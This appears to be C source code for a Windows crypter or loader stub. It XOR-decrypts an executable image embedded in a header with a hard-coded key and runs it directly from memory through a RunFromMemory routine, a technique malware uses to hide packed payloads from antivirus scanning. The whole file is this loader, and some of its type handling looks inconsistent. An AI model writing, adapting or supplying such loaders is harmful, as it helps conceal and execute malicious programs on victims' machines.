#include <windows.h>
#include <stdio.h>

#include "main.h"
#include "pe_image.h"

#define key 0x8274058120583047
//unsigned int key;
//signed long long crypt_key = 31339244358205416;

int main(){
    int i, x;
    char exec_file_path[1024];
    unsigned char decrypted_bytes[array_len+1] = {};

    /*
    for (x = 21+2; x != 0; x--) {
      key -= x ^ crypt_key;
      printf("%d\n", key);
    }

    key -= 0xdeadc0de;
    printf("%d\n", key);

    for (x = 23; x != 0; x--) {
      key += crypt_key - x ^ crypt_key;
      printf("%d\n", key);
    }
    */


    for (i = 0; i < array_len; i++) {
      if (image_crypt[i] == 0x3a11739dafdda332) {
        //printf("%s\n", "image_crypt[i] = 0x00");
        decrypted_bytes[i] = 0x00;
        image_crypt[i] = '\0';
      } else if (image_crypt[i] != 0x3a11739dafdda332) {
        //printf("%s %x\n", "image_crypt[i] =", key ^ image_crypt[i]);
        decrypted_bytes[i] = key ^ image_crypt[i];
        image_crypt[i] = '\0';
      }
    }
    system("pause");

    GetModuleFileNameA(0, exec_file_path, 1024); // Path to current executable.
    RunFromMemory((char*)decrypted_bytes, exec_file_path);
    return 0;
}
